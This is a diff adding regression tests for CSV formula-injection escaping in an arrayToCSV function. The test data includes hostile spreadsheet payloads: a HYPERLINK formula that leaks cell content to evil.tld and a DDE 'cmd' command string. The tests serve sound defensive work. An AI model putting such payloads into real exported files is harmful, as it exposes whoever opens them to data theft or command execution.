@@ -186,6 +186,31 @@ describe('arrayToCSV', () => {
     expect(lines[1]).toBe('42,true');
   });
 
+  // F-A6-07: Zellen mit fuehrendem =, +, -, @ (oder Tab/CR) wurden unveraendert exportiert und von Excel/LibreOffice als Formel ausgewertet.
+  test.each([
+    '=1+1',
+    '=HYPERLINK("https://evil.tld/?d="&B2,"Klick")',
+    '@SUM(A1)',
+    '+HYPERLINK("https://evil.tld")',
+    "-2+3+cmd|' /C calc'!A0",
+    '\t=1+1',
+    '\r=1+1',
+  ])('neutralizes a leading formula character: %j', (value) => {
+    const cell = arrayToCSV([{ v: value }]).split('\n').slice(1).join('\n');
+    const unquoted = cell.startsWith('"') ? cell.slice(1, -1).replace(/""/g, '"') : cell;
+    expect(unquoted).toBe(`'${value}`);
+  });
+
+  test('keeps plain numbers, signed numbers and phone numbers unchanged', () => {
+    const result = arrayToCSV([{ phone: '+49 30 1234-56', mobile: '+49 (0)171/123 45', delta: '-5', count: -3 }]);
+    expect(result.split('\n')[1]).toBe('+49 30 1234-56,+49 (0)171/123 45,-5,-3');
+  });
+
+  test('wraps values containing a carriage return in double quotes', () => {
+    const result = arrayToCSV([{ text: 'a\rb' }]);
+    expect(result.split('\n')[1]).toBe('"a\rb"');
+  });
+
   test('uses keys from first object for all rows', () => {
     const data = [
       { id: 1, name: 'A' },
